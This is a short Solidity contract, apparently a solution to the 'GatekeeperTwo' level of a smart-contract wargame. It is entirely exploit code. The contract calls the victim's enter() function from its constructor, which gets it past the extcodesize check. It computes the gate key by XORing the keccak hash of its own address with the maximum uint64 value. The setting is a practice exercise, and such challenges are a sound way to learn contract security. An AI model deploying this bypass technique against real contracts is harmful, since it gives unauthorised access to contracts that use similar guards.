// SPDX-License-Identifier: MIT

import "./GatekeeperTwo.sol";

pragma solidity ^0.8.0;

contract GatekeeperTwoAttack {
    GatekeeperTwo victim;

    constructor(address _address) {
        victim = GatekeeperTwo(_address);
        uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 b = type(uint64).max;
        uint64 gateKeyInt = a ^ b;
        bytes8 gateKey = bytes8(gateKeyInt);
        victim.enter(gateKey);
    }
}
